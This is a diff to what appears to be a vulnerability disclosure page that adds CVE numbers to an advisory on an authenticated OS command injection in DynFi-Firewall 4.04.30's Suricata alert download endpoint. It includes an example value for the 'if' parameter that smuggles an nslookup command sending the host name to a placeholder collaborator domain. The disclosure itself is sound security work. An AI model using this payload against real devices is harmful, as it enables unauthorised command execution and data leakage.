@@ -1,3 +1,6 @@
+
+CVE-2025-50968
+
 DynFi-Firewall 4.04.30 contains an authenticated OS command injection vulnerability in its Suricata alert download endpoint. An administrator can supply arbitrary shell metacharacters via the if parameter (e.g. if=vtnet0&nslookup $(uname -n).<COLLABORATOR>&'\"), which is passed unchecked into a system call. This allows execution of arbitrary commands on the firewall with the same privileges as the web service (typically root or highly privileged). Exploitation can lead to full remote code execution, data exfiltration, or lateral movement within the network. The root cause is the lack of input validation and improper escaping of user-controlled data in backend command invocation.
 
 Vulnerability: OS Command Injection / RCE
@@ -19,6 +22,14 @@ Payload:
 
 Demo:
 ![](https://github.com/4rdr/proofs/blob/main/gifs/DynFi-Firewall-4.04.30-RCE-via-if-parameter.gif?raw=true)
+
+
+
+
+
+
+CVE-2025-50969
+
 
 
 
